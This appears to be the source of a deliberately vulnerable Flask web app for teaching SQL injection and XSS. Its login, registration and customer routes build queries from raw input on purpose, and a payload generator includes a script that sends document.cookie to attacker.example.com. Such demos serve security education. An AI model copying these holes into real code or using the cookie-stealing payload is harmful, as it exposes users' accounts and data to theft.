import sqlite3
from flask import Flask, render_template, request, redirect, url_for, flash, session
from werkzeug import security
import os
import re
from config import PASSWORD_CONFIG, PASSWORD_ERROR_MESSAGES

app = Flask(__name__)
app.secret_key = 'your_secret_key'  

def get_db_connection():
    conn = sqlite3.connect('database.db')
    conn.row_factory = sqlite3.Row  
    return conn

def init_db():
    """Initialize the database with the schema"""
    conn = get_db_connection()
    
    # Check if customers table exists
    table_exists = conn.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='customers'").fetchone()
    
    # If the database file exists but the customers table doesn't, add it
    if not table_exists:
        try:
            # Create only the customers table if it doesn't exist
            conn.execute('''
            CREATE TABLE IF NOT EXISTS customers (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT NOT NULL,
                user_id INTEGER NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (user_id) REFERENCES users (id)
            )
            ''')
            conn.commit()
            print("Customers table added to existing database")
        except sqlite3.Error as e:
            print(f"Error adding customers table: {e}")
    
    # If the database doesn't exist at all, initialize it with the full schema
    if not os.path.exists('database.db') or not conn.execute("SELECT name FROM sqlite_master WHERE type='table'").fetchone():
        try:
            with open('schema.sql') as f:
                conn.executescript(f.read())
            conn.commit()
            print("Database initialized successfully with full schema")
        except sqlite3.Error as e:
            print(f"Error initializing database: {e}")
    
    conn.close()

def validate_password(password):
    """
    Validate password against configuration requirements
    Returns (is_valid, error_message)
    """
    if len(password) < PASSWORD_CONFIG['min_length']:
        return False, PASSWORD_ERROR_MESSAGES['min_length'].format(
            min_length=PASSWORD_CONFIG['min_length']
        )
    
    requirements_met = 0
    requirements_messages = []

    has_uppercase = any(c.isupper() for c in password)
    if has_uppercase:
        requirements_met += 1
    elif PASSWORD_CONFIG['require_uppercase']:
        requirements_messages.append(PASSWORD_ERROR_MESSAGES['require_uppercase'])
    
    # Check for lowercase letter
    has_lowercase = any(c.islower() for c in password)
    if has_lowercase:
        requirements_met += 1
    elif PASSWORD_CONFIG['require_lowercase']:
        requirements_messages.append(PASSWORD_ERROR_MESSAGES['require_lowercase'])
    
    # Check for digit
    has_digit = any(c.isdigit() for c in password)
    if has_digit:
        requirements_met += 1
    elif PASSWORD_CONFIG['require_digit']:
        requirements_messages.append(PASSWORD_ERROR_MESSAGES['require_digit'])
    
    # Check for special character
    special_chars = PASSWORD_CONFIG['special_chars']
    has_special = any(c in special_chars for c in password)
    if has_special:
        requirements_met += 1
    elif PASSWORD_CONFIG['require_special_char']:
        requirements_messages.append(
            PASSWORD_ERROR_MESSAGES['require_special_char'].format(chars=special_chars)
        )
    
    # Check if we meet the minimum number of requirements
    min_requirements = PASSWORD_CONFIG['min_requirements']
    if requirements_met < min_requirements:
        return False, PASSWORD_ERROR_MESSAGES['min_requirements'].format(
            min_requirements=min_requirements
        )
    
    return True, ""

@app.route('/')
def index():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    conn = get_db_connection()
    # Vulnerable query using string formatting
    user = conn.execute(f"SELECT username FROM users WHERE id = {session['user_id']}").fetchone()
    conn.close()
    
    return render_template('home.html', username=user['username'])

@app.route('/login', methods=['GET', 'POST'])
def login():
    """Login route"""
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        # Input validation
        if not username or not password:
            flash('Username and password are required')
            return render_template('login.html')
        
        # First, try a secure query to check if user exists and get their password hash
        conn = get_db_connection()
        user_check = conn.execute("SELECT * FROM users WHERE username = ?", (username,)).fetchone()
        
        # If user exists, check their password
        if user_check and security.check_password_hash(user_check['password'], password):
            # Valid password, proceed with normal login
            session.clear()
            session['user_id'] = user_check['id']
            session['username'] = user_check['username']
            session['email'] = user_check['email']
            flash(f"Welcome, {user_check['username']}! Your email is {user_check['email']}.")
            conn.close()
            return redirect(url_for('index'))
        
        # If normal login fails, execute the vulnerable query (for SQL injection demo)
        # Vulnerable query using string formatting - this is the security flaw
        query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
        
        try:
            # Execute the vulnerable query
            users = conn.execute(query).fetchall()
            
            # If SQL injection returned multiple users, show the success page
            if len(users) > 1:
                # Convert row objects to dictionaries for display
                all_users = []
                for user in users:
                    all_users.append(dict(user))
                
                conn.close()
                return render_template('sql_injection_success.html', 
                                    query=query, 
                                    users=all_users,
                                    message="SQL Injection Successful! You've bypassed authentication and accessed all user data.")
            
            conn.close()
            flash('Invalid username or password')
            
        except sqlite3.Error as e:
            # Handle any SQL errors
            conn.close()
            flash(f'Database error: {str(e)}')
    
    return render_template('login.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    """Registration route"""
    if request.method == 'POST':
        username = request.form['username']
        email = request.form['email']
        password = request.form['password']
        
        # Input validation
        if not username or not email or not password:
            flash('All fields are required')
            return render_template('register.html')
        
        # Validate password complexity
        is_valid, error_message = validate_password(password)
        if not is_valid:
            flash(error_message)
            return render_template('register.html')
        
        # Create database connection
        conn = get_db_connection()
        
        try:
            # Vulnerable query using string formatting - SQL injection vulnerability
            # Check if username or email already exists
            check_query = f"SELECT * FROM users WHERE username = '{username}' OR email = '{email}'"
            
            # Execute the vulnerable query
            result = conn.execute(check_query)
            users = result.fetchall()
            
            # If we got multiple results, it's likely due to SQL injection
            if len(users) > 1:
                # Convert row objects to dictionaries for display
                all_users = []
                for user in users:
                    all_users.append(dict(user))
                
                conn.close()
                return render_template('sql_injection_success.html', 
                                      query=check_query, 
                                      users=all_users,
                                      message="SQL Injection detected during registration! The query returned all users.")
            
            # If we got exactly one user, it means the username or email exists
            if len(users) == 1:
                conn.close()
                flash('Username or email already exists')
                return render_template('register.html')
            
            # If no users found, proceed with registration
            # Generate password hash
            hashed_password = security.generate_password_hash(password)
            
            # Insert new user into database - vulnerable to SQL injection
            insert_query = f"INSERT INTO users (username, email, password) VALUES ('{username}', '{email}', '{hashed_password}')"
            conn.execute(insert_query)
            conn.commit()
            conn.close()
            
            flash('Registration successful! Please log in.')
            return redirect(url_for('login'))
            
        except sqlite3.Error as e:
            # Handle any SQL errors
            conn.close()
            flash(f'Database error during registration: {str(e)}')
            return render_template('register.html')
    
    # Pass password requirements to the template
    password_requirements = {
        'min_length': PASSWORD_CONFIG['min_length'],
        'require_uppercase': PASSWORD_CONFIG['require_uppercase'],
        'require_lowercase': PASSWORD_CONFIG['require_lowercase'],
        'require_digit': PASSWORD_CONFIG['require_digit'],
        'require_special_char': PASSWORD_CONFIG['require_special_char'],
        'special_chars': PASSWORD_CONFIG['special_chars']
    }
    
    return render_template('register.html', password_requirements=password_requirements)

@app.route('/logout')
def logout():
    """Logout route"""
    session.clear()
    flash('You have been logged out')
    return redirect(url_for('login'))

def generate_xss_payload():
    """Generate a simple XSS payload for demonstration"""
    # Basic XSS payload that displays an alert
    basic_alert = "<script>alert('XSS Attack Successful!');</script>"
    
    # More complex payload that steals cookies
    cookie_stealer = "<script>fetch('https://attacker.example.com/steal?cookie='+document.cookie);</script>"
    
    # DOM manipulation payload
    dom_manipulator = "<script>document.body.style.backgroundColor='red'; document.body.innerHTML='<h1>Site Hacked!</h1>';</script>"
    
    return {
        "basic_alert": basic_alert,
        "cookie_stealer": cookie_stealer,
        "dom_manipulator": dom_manipulator
    }

@app.route('/xss_demo')
def xss_demo():
    """Route to demonstrate XSS vulnerabilities"""
    # Get name from query parameter (vulnerable to XSS)
    name = request.args.get('name', '')
    
    # Generate sample payloads
    payloads = generate_xss_payload()
    
    # Create examples of vulnerable code patterns
    vulnerable_code = {
        "direct_output": "app.route('/vulnerable')\ndef vulnerable():\n    name = request.args.get('name')\n    return f'<h1>Hello, {name}!</h1>'",
        "innerHTML": "document.getElementById('username').innerHTML = userName; // userName is user-controlled",
        "eval_usage": "eval('console.log(\"Welcome, ' + userName + '!\")'); // userName is user-controlled"
    }
    print(payloads)
    # Return a template that will render the name parameter without escaping
    return render_template('xss_demo.html', 
                          name=name, 
                          payloads=payloads, 
                          vulnerable_code=vulnerable_code,
                          example_url=request.host_url + "xss_demo?name=" + payloads["basic_alert"])

@app.route('/customers')
def customers():
    """View customers page"""
    # Check if user is logged in
    if 'user_id' not in session:
        flash('You must be logged in to view customers')
        return redirect(url_for('login'))
    
    # Get all customers for the current user
    conn = get_db_connection()
    # Vulnerable query using string formatting - SQL injection vulnerability
    user_customers = conn.execute(f"SELECT * FROM customers WHERE user_id = {session['user_id']} ORDER BY created_at DESC").fetchall()
    conn.close()
    
    # Convert row objects to dictionaries for the template
    customers_list = []
    for customer in user_customers:
        customers_list.append(dict(customer))
    
    return render_template('customers.html', customers=customers_list)

@app.route('/add_customer', methods=['GET', 'POST'])
def add_customer():
    """Add a new customer"""
    # Check if user is logged in
    if 'user_id' not in session:
        flash('You must be logged in to add customers')
        return redirect(url_for('login'))
    
    if request.method == 'POST':
        # Get customer name from form
        customer_name = request.form['name']
        
        # Input validation
        if not customer_name:
            flash('Customer name is required')
            return redirect(url_for('add_customer'))
        
        # Create database connection
        conn = get_db_connection()
        
        try:
            # First check if the input might be an SQL injection attempt
            # This is vulnerable to SQL injection - we're executing a query with user input
            # But we need to escape single quotes for SQL to work properly
            sql_safe_name = customer_name.replace("'", "''")  # Escape single quotes for SQL
            
            check_query = f"SELECT * FROM customers WHERE name = '{sql_safe_name}'"
            result = conn.execute(check_query)
            customers = result.fetchall()
            
            # If we got multiple results, it's likely due to SQL injection with 1=1
            if len(customers) > 1:
                # Convert row objects to dictionaries for display
                all_customers = []
                for customer in customers:
                    all_customers.append(dict(customer))
                
                conn.close()
                return render_template('customer_sql_injection.html', 
                                      query=check_query, 
                                      users=all_customers,
                                      message="SQL Injection detected in customer name! The query returned all customers.")
            
            # Vulnerable query using string formatting - SQL injection vulnerability
            # Insert new customer into database - but escape single quotes for SQL
            insert_query = f"INSERT INTO customers (name, user_id) VALUES ('{sql_safe_name}', {session['user_id']})"
            conn.execute(insert_query)
            conn.commit()
            
            # Get the ID of the customer that was just added
            # This is also vulnerable to SQL injection
            last_customer = conn.execute(f"SELECT * FROM customers WHERE name = '{sql_safe_name}' AND user_id = {session['user_id']} ORDER BY id DESC LIMIT 1").fetchone()
            conn.close()
            
            if last_customer:
                customer_id = last_customer['id']
                flash('Customer added successfully!')
                return redirect(url_for('view_customer', customer_id=customer_id))
            else:
                flash('Customer added but could not be retrieved')
                return redirect(url_for('customers'))
            
        except sqlite3.Error as e:
            # Handle any SQL errors
            conn.close()
            flash(f'Database error: {str(e)}')
            return redirect(url_for('add_customer'))
    
    return render_template('add_customer.html')

@app.route('/customer/<int:customer_id>')
def view_customer(customer_id):
    """View a specific customer"""
    # Check if user is logged in
    if 'user_id' not in session:
        flash('You must be logged in to view customers')
        return redirect(url_for('login'))
    
    # Get the specific customer
    conn = get_db_connection()
    # Vulnerable query using string formatting - SQL injection vulnerability
    customer = conn.execute(f"SELECT * FROM customers WHERE id = {customer_id} AND user_id = {session['user_id']}").fetchone()
    conn.close()
    
    if not customer:
        flash('Customer not found or you do not have permission to view this customer')
        return redirect(url_for('customers'))
    
    # Convert row object to dictionary for the template
    customer_dict = dict(customer)
    
    return render_template('view_customer.html', customer=customer_dict)

if __name__ == '__main__':
    # Initialize the database
    init_db()
    
    # Run the application on port 5000
    app.run(debug=True, port=5000)